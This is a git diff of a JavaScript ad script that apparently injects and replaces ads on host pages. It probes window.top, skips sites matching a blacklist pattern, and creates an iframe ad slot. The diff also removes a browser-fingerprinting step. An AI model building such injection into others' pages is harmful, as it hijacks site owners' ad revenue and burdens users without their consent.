@@ -1,5 +1,5 @@
 import { phone } from 'ismobilejs';
-import { mobileExtend, PCExtend } from './utils';
+import getAd from './utils';
 import { mobileReplace, PCReplace } from './replace';
 // import { AD_0X0 } from './config';
 // if (phone) {
@@ -15,15 +15,9 @@ const hostname = Object.keys(window.top.location).length > 5 && window.top.locat
 function extend() {
   if (window.top.adExtendsJS || blackWebsite.test(hostname)) return;
   window.top.adExtendsJS = `${name}-${version}`;
-  if (window.top.Fingerprint2) {
-    new Fingerprint2().get(() => {
-      if (phone) mobileExtend();
-      else PCExtend();
-    });
-    return;
-  }
-  if (phone) mobileExtend();
-  else PCExtend();
+  getAd();
+  // if (phone) mobileExtend();
+  // else PCExtend();
 }
 
 function replace() {
@@ -107,12 +101,10 @@ if (document.addEventListener) {
   document.attachEvent('onreadystatechange', handler);
 }
 
-// setInterval(() => {
-//   if (phone && hostname) clear();
-// }, 3000);
+setInterval(() => {
+  if (phone && hostname) clear();
+}, 3000);
 
-// <img src="//643108e7617ef.cdn.sohucs.com/b3b575305920429ea56362dbc1bd6526.jpg">
-// <img style="" src="https://ubmcmm.baidustatic.com/media/v1/0f000K00VmHXt2AS88Alqf.jpg">
 setTimeout(() => {
   if (phone && hostname && !window.top.getInsert) { // 头部广告位
     const iframe = document.createElement('iframe');
